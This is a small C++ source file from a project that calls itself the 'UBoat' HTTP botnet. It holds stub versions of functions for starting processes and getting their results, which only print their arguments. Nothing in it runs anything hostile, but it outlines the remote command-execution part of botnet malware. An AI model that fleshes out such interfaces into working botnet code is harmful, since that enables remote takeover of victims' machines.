/**
 * This file is part of UBoat - HTTP Botnet Project
 */

#include <iostream>
#include <string>

#include "Processes.hpp"

namespace UBoat {
namespace Processes {
    std::string GetResult(const std::string& processName, const std::string& args)
    {
        std::cout << "Processes::GetResult(`" << processName << "`, `" << args << "`)" << std::endl;

        return std::string("");
    }

    bool Start(const std::string& processName, const std::string& args)
    {
        std::cout << "Processes::Start(`" << processName << "`, `" << args << "`)" << std::endl;

        return false;
    }
} // Processes
} // UBoat
